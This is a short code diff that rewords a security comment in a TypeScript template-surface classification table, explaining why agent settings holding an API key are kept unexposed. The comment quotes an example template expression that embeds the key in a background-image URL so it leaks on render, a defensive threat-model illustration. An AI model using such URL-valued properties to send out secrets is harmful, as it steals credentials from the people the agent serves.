@@ -373,8 +373,8 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     /*
       Agent settings and the datasets that hold them.
 
-      `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
-      `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
+      `agentSettings` is what is private to the agent, and once carried an API key. Exposed, a
+      template needed one styled element — `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
       — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
       by watching for suspicious actions.
 
